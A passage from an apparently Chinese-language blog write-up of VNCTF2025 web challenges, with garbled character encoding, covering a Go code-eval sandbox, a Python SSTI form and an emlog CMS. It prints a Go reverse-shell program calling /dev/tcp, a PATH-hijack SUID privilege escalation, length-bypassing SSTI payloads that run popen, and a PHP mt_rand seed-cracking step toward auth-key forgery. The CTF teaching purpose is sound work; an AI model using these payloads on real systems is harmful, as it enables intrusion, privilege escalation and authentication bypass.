class="hljs-title">Eval</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>code := c.PostForm(<span class="hljs-string">&quot;code&quot;</span>)<br>log.Println(code)<br><span class="hljs-keyword">if</span> code == <span class="hljs-string">&quot;&quot;</span> &#123;<br>response.Response(c, http.StatusBadRequest, <span class="hljs-number">400</span>, <span class="hljs-literal">nil</span>, <span class="hljs-string">&quot;No code provided&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>log.Println(containsBannedPackages(code))<br><span class="hljs-keyword">if</span> containsBannedPackages(code) &#123;<br>response.Response(c, http.StatusBadRequest, <span class="hljs-number">400</span>, <span class="hljs-literal">nil</span>, <span class="hljs-string">&quot;Code contains banned packages&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>tmpFile, err := ioutil.TempFile(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;goeval-*.go&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Println(<span class="hljs-string">&quot;Error creating temp file:&quot;</span>, err)<br>response.Response(c, http.StatusInternalServerError, <span class="hljs-number">500</span>, <span class="hljs-literal">nil</span>, <span class="hljs-string">&quot;Error creating temporary file&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> os.Remove(tmpFile.Name())<br><br>_, err = tmpFile.WriteString(code)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Println(<span class="hljs-string">&quot;Error writing code to temp file:&quot;</span>, err)<br>response.Response(c, http.StatusInternalServerError, <span class="hljs-number">500</span>, <span class="hljs-literal">nil</span>, <span class="hljs-string">&quot;Error writing code to temp file&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>cmd := exec.Command(<span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-string">&quot;run&quot;</span>, tmpFile.Name())<br>output, err := cmd.CombinedOutput()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Println(<span class="hljs-string">&quot;Error running Go code:&quot;</span>, err)<br>response.Response(c, http.StatusInternalServerError, <span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-type">string</span>(output)&#125;, <span class="hljs-string">&quot;Error executing code&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>response.Success(c, gin.H&#123;<span class="hljs-string">&quot;result&quot;</span>: <span class="hljs-type">string</span>(output)&#125;, <span class="hljs-string">&quot;success&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>å…³é”®åœ¨è¿™é‡Œï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">containsBannedPackages</span><span class="hljs-params">(code <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>importRegex := <span class="hljs-string">`(?i)import\s*\((?s:.*?)\)`</span><br>re := regexp.MustCompile(importRegex)<br>matches := re.FindStringSubmatch(code)<br>imports := matches[<span class="hljs-number">0</span>]<br>log.Println(imports)<br><span class="hljs-keyword">if</span> strings.Contains(imports, <span class="hljs-string">&quot;os/exec&quot;</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœadminèº«ä»½è¿›å…¥æ²™ç®±ï¼Œè¿™é‡Œä¼šåŒ¹é…<code>os/exec</code>ï¼Œä¸è®©ä½ å¤–éƒ¨æ‰§è¡Œå‘½ä»¤ã€‚</p><p>ä½†æ˜¯æ ¹æœ¬éš¾ä¸å€’ä»–ï¼Œ<code>syscall</code>ä¹Ÿèƒ½æ‰“ã€‚</p><p>å…¶å®ç»†å¿ƒä¸€ç‚¹çœ‹ä»£ç ï¼Œå°±ä¼šå‘ç°è¿™é‡Œçš„åŒ¹é…åªåŒ¹é…äº†ç¬¬ä¸€ä¸ªimportï¼Œæ„æ€å°±æ˜¯ä½ importä¸¤æ¬¡ç¬¬äºŒæ¬¡ä»–æ ¹æœ¬å°±ä¸æ£€æŸ¥ï¼Œå¤ªéš¾ç»·äº†â€¦â€¦</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;log&quot;</span><br>)<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;os/exec&quot;</span><br>)<br></code></pre></td></tr></table></figure><p>è€Œè¯»å–åˆ°key.goåï¼Œæˆ‘ä»¬èƒ½ç›´æ¥æ‹¿æœ¬åœ°ç”Ÿæˆçš„tokenå»å¥—è¿œç¨‹ç¯å¢ƒï¼Œå› ä¸ºè¿™é‡Œmt_randä¼ªéšæœºæ•°ç”Ÿæˆçš„<code>JWT KEY</code>æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥ä»ç„¶æœ‰æ•ˆã€‚</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210010014143.png" alt="image-20250210010014143"></p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210010025744.png" alt="image-20250210010025744"></p><p>è¿™é‡Œæ‰§è¡Œï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;syscall&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// Define the command and arguments</span><br>cmd := <span class="hljs-string">&quot;/bin/bash&quot;</span><br>args := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&quot;</span>&#125;<br><br><span class="hljs-comment">// Execute the command</span><br>err := syscall.Exec(cmd, args, <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Error executing command: %v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210145941925.png" alt="image-20250210145941925"></p><p>åå¼¹shellæˆåŠŸï¼š</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210010105078.png" alt="image-20250210010105078"></p><p>æ ¹ç›®å½•å‡flagï¼Œsuidææƒçœ‹çœ‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°ä¸ª&#x2F;â€¦&#x2F;Catï¼Œåªä¼šè¾“å‡ºæ ¹ç›®å½•é‚£ä¸ªå‡flagã€‚<br>å‘ç°&#x2F;â€¦&#x2F;Catï¼Œæˆ‘ä»¬base64ç»™ä»–å¼„ä¸‹æ¥é€†ä¸€ä¸‹ï¼Œä¸»é€»è¾‘ï¼š</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210010128026.png" alt="image-20250210010128026"></p><p>è¿™é‡Œçš„Catä¼šæ‰§è¡Œcat &#x2F;flagæ‹¿å‡flagå‘½ä»¤ï¼Œå¼€å§‹æˆ‘è¿˜æ²¡æƒ³åˆ°ï¼Œè¿˜è¯•äº†è¯•ç¼–è¯‘æ¶æ„soæ‰“LD_PRELOADï¼Œä½†æ˜¯å¤±è´¥äº†ã€‚</p><p>åé¢ä¸€æœsuidæ–¹æ³•ï¼Œæœåˆ°äº†ä¸ªç¯å¢ƒå˜é‡ææƒçš„æ‰‹æ®µï¼Œæ–°çŸ¥è¯†å•Šï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; /tmp/cat &amp;&amp; <span class="hljs-built_in">chmod</span> +x /tmp/cat<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p>å¤§è‡´æ„æ€å°±æ˜¯ï¼Œæˆ‘ä»¬åœ¨tmpå†…å†™ä¸€ä¸ªcatï¼Œå°†&#x2F;bin&#x2F;bashå†™è¿›å»ï¼Œç„¶åç¯å¢ƒå˜é‡è®¾ç½®&#x2F;tmpï¼Œé‚£ä¹ˆæ‰§è¡Œè¿™ä¸ª&#x2F;â€¦&#x2F;Catæ—¶ä¼šæ‰§è¡Œcatï¼Œè€Œcatå‘½ä»¤å°±ä¼šä¼˜å…ˆåœ¨ç¯å¢ƒå˜é‡å¯»æ‰¾ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œäº†&#x2F;tmp&#x2F;catï¼Œæ­¤æ—¶å°±æ‰§è¡Œåˆ°rootæƒé™çš„&#x2F;bin&#x2F;bashè€Œæ‹¿åˆ°äº†é«˜æƒé™shellã€‚</p><p>ä½†æ˜¯ç›´æ¥è¯»&#x2F;rootä¸‹çš„flagå¥½åƒæ²¡ååº”ï¼Ÿç®—äº†éƒ½chmod 777å†å¼¹ä¸€æ¬¡å°±è¡Œäº†ï¼š</p><p><img src="/2025/02/09/VNCTF2025-WEB/308ae036c3b7f36de06fd42201641bdc.png" alt="img"></p><h2 id="å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ"><a href="#å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ" class="headerlink" title="å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ"></a>å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ</h2><p><code>&#123;&#123;7*'7'&#125;&#125;</code>èƒ½ç›´æ¥æŸ¥å‡ºpythonçš„SSTIï¼Œä½†æ˜¯é™åˆ¶äº†é•¿åº¦æœ€å¤§23ï¼Œè€Œä¸”openè¢«banäº†ã€‚</p><p>é¢˜ç›®å…¶å®æç¤ºäº†ä¸€è¡Œä¸€ä¸ªåå­—ï¼Œåº”è¯¥æ˜¯ç”¨æ¢è¡Œæ¥ç»•è¿™ä¸ªé™åˆ¶ã€‚è¿™é‡Œä½¿ç”¨<code>%0a</code>å°±èƒ½ç»•ã€‚</p><p>è¿™é‡Œçš„å•æ–‡ä»¶æ¡†æ¶å…¶å®å°±æ˜¯bottleï¼Œè™½ç„¶ä¸å¤ªçŸ¥é“ï¼Œä½†æ˜¯çŸ¥ä¸çŸ¥é“éƒ½æ— æ‰€è°“ï¼Œæµ‹ä¸€æµ‹å°±çŸ¥é“èµ‹å€¼æ‰“æ³•èƒ½ç›´æ¥å¸¸è§„SSTIä¸€æŠŠæ¢­äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;a:=<span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;<br>&#123;&#123;b:=a.__class__&#125;&#125;<br>&#123;&#123;c:=b.__base__&#125;&#125;<br>&#123;&#123;d:=c.__subclasses__&#125;&#125;<br>&#123;&#123;e:=d()[<span class="hljs-number">154</span>]&#125;&#125;  <br>&#123;&#123;f:=e.__init__&#125;&#125;<br>&#123;&#123;g:=f.__globals__&#125;&#125;<br>&#123;&#123;h:=g[<span class="hljs-string">&#x27;pop&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>]&#125;&#125;<br>&#123;&#123;i:=h(<span class="hljs-string">&quot;cat /flag&quot;</span>)&#125;&#125;<br>&#123;&#123;j:=i.read()&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;a:=<span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;%0a&#123;&#123;b:=a.__class__&#125;&#125;%0a&#123;&#123;c:=b.__base__&#125;&#125;%0a&#123;&#123;d:=c.__subclasses__&#125;&#125;%0a&#123;&#123;e:=d()[<span class="hljs-number">154</span>]&#125;&#125;%0a&#123;&#123;f:=e.__init__&#125;&#125;%0a&#123;&#123;g:=f.__globals__&#125;&#125;%0a&#123;&#123;h:=g[<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>]&#125;&#125;%0a&#123;&#123;i:=h(<span class="hljs-string">&quot;cat /flag&quot;</span>)&#125;&#125;%0a&#123;&#123;j:=i.read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>ä½†è¿™æ ·ç›´æ¥æ‰“å¥½åƒæœ‰ç‚¹è¯†åˆ«é—®é¢˜ï¼Ÿè€Œä¸”æ— å›æ˜¾ï¼Œæµ‹<code>&#123;&#123;print(5)&#125;&#125;</code>å°±èƒ½çŸ¥é“ã€‚</p><p>å»ºè®®å‘HTTPåŒ…æ‰“æˆ–è€…hackbarï¼Œç”¨openæ‰“ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;a:=<span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;%0a&#123;&#123;b:=a.__class__&#125;&#125;%0a&#123;&#123;c:=b.__base__&#125;&#125;%0a&#123;&#123;d:=c.__subclasses__&#125;&#125;%0a&#123;&#123;e:=d()[<span class="hljs-number">156</span>]&#125;&#125;%0a&#123;&#123;f:=e.__init__&#125;&#125;%0a&#123;&#123;g:=f.__globals__&#125;&#125;%0a&#123;&#123;z:=<span class="hljs-string">&#x27;__builtins__&#x27;</span>&#125;&#125;%0a&#123;&#123;h:=g[z]&#125;&#125;%0a&#123;&#123;i:=h[<span class="hljs-string">&#x27;op&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>]&#125;&#125;%0a&#123;&#123;x:=i(<span class="hljs-string">&quot;/flag&quot;</span>)&#125;&#125;%0a&#123;&#123;y:=x.read()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210153054779.png" alt="image-20250210153054779"></p><h2 id="ez-emlog"><a href="#ez-emlog" class="headerlink" title="ez_emlog"></a>ez_emlog</h2><p>æ®è¯´æ˜¯ä¸ª0dayã€‚</p><p>åˆ†å‰å°ç™»å½•å’Œåå°RCEä¸¤æ­¥ã€‚</p><p>å‰å°ç™»å½•éœ€è¦æ‹¿åˆ°AUTH_KEYï¼Œç„¶åSQLæ³¨å…¥æ‹¿åˆ°å¯ç”¨ç”¨æˆ·åï¼Œç„¶åç”¨è¿™ä¸ªç”¨æˆ·åå’ŒAUTH_KEYç”Ÿæˆå¯ç”¨cookieç»™CSRFè¿›åå°ï¼Œåå°å¯ä»¥ä¸Šä¼ æ¶æ„æ’ä»¶RCEã€‚</p><p>å»å®˜æ–¹ä¸‹è½½å®ƒçš„æºç ï¼Œå…ˆå®¡è®¡ä¸€ä¸‹<code>install.php</code>ï¼š</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210153854027.png" alt="image-20250210153854027"></p><p>AUTH_KEYå’ŒAUTH_COOKIE_NAMEéƒ½ä½¿ç”¨äº†getRandStr()ç”Ÿæˆéšæœºåºåˆ—ï¼Œè·Ÿè¿›ï¼š</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210154001434.png" alt="image-20250210154001434"></p><p>çœ‹åˆ°äº†é¢˜ç›®æç¤ºçš„mt_randå®‰å…¨é—®é¢˜ï¼Œè¿™é‡Œåªéœ€è¦è·å¾—ç¡®å®šçš„åºåˆ—å°±èƒ½ç ´è¿™ä¸ªä¼ªéšæœºæ•°ï¼Œé¢„æµ‹å‡ºAUTH_KEYã€‚</p><p>å®¡è®¡æºç èƒ½çŸ¥é“è·å¾—ç§å­seedæœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ³¨å†Œç”¨æˆ·å¹¶ç™»å½•ï¼Œä½†æ˜¯é¢˜ç›®ç»™å…³äº†ã€‚</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210154434571.png" alt="image-20250210154434571"></p><p>ç»§ç»­å®¡è®¡æºç ï¼Œå‘ç°logoutå‡ºå»ä¹Ÿèƒ½set-cookieã€‚</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210154358953.png" alt="image-20250210154358953"></p><p>å®¡ä¸€ä¸‹å¾—åˆ°è®¿é—®é€»è¾‘ï¼Œé‚£æˆ‘ä»¬å¯ä»¥å…ˆè®¿é—®action&#x3D;logoutè·¯ç”±æŠ“åŒ…è·å–è¿™æ®µcookieæ‹¿å»çˆ†ç§å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowable_characters</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br><span class="hljs-variable">$len</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$allowable_characters</span>) - <span class="hljs-number">1</span>;<br><span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr&quot;</span>;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$pass</span>); <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;0 0 0 0 &quot;</span>;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$pass</span>); <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$number</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$allowable_characters</span>, <span class="hljs-variable">$pass</span>[<span class="hljs-variable">$i</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$number</span> <span class="hljs-subst">$number</span> 0 <span class="hljs-subst">$len</span> &quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ºäº†ç”Ÿæˆç¬¦åˆçˆ†ç ´è§„åˆ™çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥æŠŠå‰é¢32ä½æœªçŸ¥çš„å€¼å†™ä¸º<code>0 0 0 0</code>ï¼Œè¿è¡Œå¾—åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">43</span> <span class="hljs-number">43</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">26</span> <span class="hljs-number">26</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">48</span> <span class="hljs-number">48</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">21</span> <span class="hljs-number">21</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">35</span> <span class="hljs-number">35</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">51</span> <span class="hljs-number">51</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">57</span> <span class="hljs-number">57</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">50</span> <span class="hljs-number">50</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">38</span> <span class="hljs-number">38</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">4</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">51</span> <span class="hljs-number">51</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">37</span> <span class="hljs-number">37</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">32</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">38</span> <span class="hljs-number">38</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">17</span> <span class="hljs-number">17</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">57</span> <span class="hljs-number">57</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">58</span> <span class="hljs-number">58</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">11</span> <span class="hljs-number">11</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">5</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">9</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">47</span> <span class="hljs-number">47</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">11</span> <span class="hljs-number">11</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">40</span> <span class="hljs-number">40</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">55</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">24</span> <span class="hljs-number">24</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">16</span> <span class="hljs-number">16</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">50</span> <span class="hljs-number">50</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">11</span> <span class="hljs-number">11</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">17</span> <span class="hljs-number">17</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210154643999.png" alt="image-20250210154643999"></p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210161426050.png" alt="image-20250210161426050"></p><p>çˆ†å‡ºç§å­ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">2430606281</span><br></code></pre></td></tr></table></figure><p>å›åˆ°é‰´æƒé€»è¾‘ï¼š</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210161242617.png" alt="image-20250210161242617"></p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210161342127.png" alt="image-20250210161342127"></p><p>æ˜¾ç„¶è¿™é‡Œå¯ä»¥æ„é€ æ°¸çœŸå¼SQLæ‰“ä¸ªæŠ¥é”™æ³¨å…¥ï¼Œè¿™é‡Œçš„UAå¤´æ˜¯ç½‘ç«™é¡µé¢é‚£ä¸ªåšå®¢é‡Œç»™çš„UAï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$seed</span> = <span class="hljs-number">2430606281</span>;<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br><span class="hljs-variable">$rand_string</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()&quot;</span>;<br><br><span class="hljs-variable">$retStr</span> = <span 